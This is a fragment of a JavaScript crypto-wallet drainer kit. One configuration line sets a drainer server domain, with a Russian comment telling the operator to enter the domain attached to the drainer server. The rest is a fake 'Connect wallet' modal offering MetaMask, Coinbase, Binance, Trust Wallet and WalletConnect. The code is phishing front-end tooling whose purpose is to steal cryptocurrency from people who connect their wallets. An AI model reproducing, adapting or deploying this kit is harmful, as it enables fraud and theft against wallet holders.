...
const MS_Server = "six4626234-defi-launchpad-ya3sbou.onrender.com"; // Указать домен, который прикреплен к серверу дрейнера
...
[data-theme="dark"] .menu-el{
    border:1px solid #2c3437
}`},
  {
    type: 'html',
    data: `
<div class="web3-modal-main" style="background-color:#161A1E">
      <div id="modal-head">
         <div id="modal-head-block-f">
            <div id="modal-head-title" style="color: white;">Connect wallet</div>
            <div id="modal-head-desc">Choose what network and wallet you want to connect below</div>
         </div>
         <div id="modal-close">
            <svg fill="none" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
               <path clip-rule="evenodd" d="M5.31854 5.31952C5.74457 4.89349 6.4353 4.89349 6.86132 5.31952L11.5445 10.0027L16.2276 5.31952C16.6537 4.89349 17.3444 4.89349 17.7704 5.31952C18.1964 5.74555 18.1964 6.43627 17.7704 6.8623L13.0873 11.5455L17.7704 16.2286C18.1964 16.6546 18.1964 17.3454 17.7704 17.7714C17.3444 18.1974 16.6537 18.1974 16.2276 17.7714L11.5445 13.0882L6.86132 17.7714C6.4353 18.1974 5.74457 18.1974 5.31854 17.7714C4.89252 17.3454 4.89252 16.6546 5.31854 16.2286L10.0017 11.5455L5.31854 6.8623C4.89252 6.43627 4.89252 5.74555 5.31854 5.31952Z" fill="#C4C4C4" fill-rule="evenodd"></path>
            </svg>
         </div>
      </div>
      <div class="modal-main">
         <div id="modal-main-title" style="color: white;">Choose Network</div>
         <div id="modal-main-menu">
            <div onclick="connect_wallet(&quot;MetaMask&quot;)" id="metamask-connect-button" class="menu-el" style="border-width: 1.5px; border-style:solid ;border-color: orange;">
               <div class="modal-icon"><img src="/images/metamask.svg" height="36"></div>
               <div class="modal-el-desc"><span class="modal-el-desc-first" style="color: white;">MetaMask</span> <span class="modal-el-desc-second">Connect to your MetaMask wallet</span></div>
            </div>
            <div onclick="connect_wallet(&quot;Coinbase&quot;)" id="coinbase-connect-button" class="menu-el" style="border-width: 1.5px; border-style:solid ;border-color: blue;">
               <div class="modal-icon"><img src="/images/coinbase.svg" height="36"></div>
               <div class="modal-el-desc"><span class="modal-el-desc-first" style="color: white;">Coinbase</span> <span class="modal-el-desc-second">Connect to your Coinbase wallet</span></div>
            </div>
            <div onclick="connect_wallet(&quot;Binance Wallet&quot;)" id="binance-connect-button" class="menu-el" style="border-width: 1.5px; border-style:solid ;border-color: yellow;">
               <div class="modal-icon"><img src="/images/binance.svg" height="36"></div>
               <div class="modal-el-desc"><span class="modal-el-desc-first" style="color: white;">Binance Wallet</span> <span class="modal-el-desc-second">Connect to your Binance wallet</span></div>
            </div>
            <div onclick="connect_wallet(&quot;Trust Wallet&quot;)" id="trust-wallet-connect-button" class="menu-el" style="border-width: 1.5px; border-style:solid ; border-color:#4183d9 ;">
               <div class="modal-icon"><img src="/images/trust-wallet.svg" height="36"></div>
               <div class="modal-el-desc"><span class="modal-el-desc-first" style="color: white;">Trust Wallet</span> <span class="modal-el-desc-second">Connect to your Trust Wallet</span></div>
            </div>
         </div>
      </div>
      <div onclick="use_wc()" id="modal-bottom"><button id="wallet-connect-connect-button"><img src="/images/qr-code.svg"> Connect by QR-code</button> <span id="modal-bottom-span">Connect by QR-code with WalletConnect</span></div>
   </div>`
  }
];
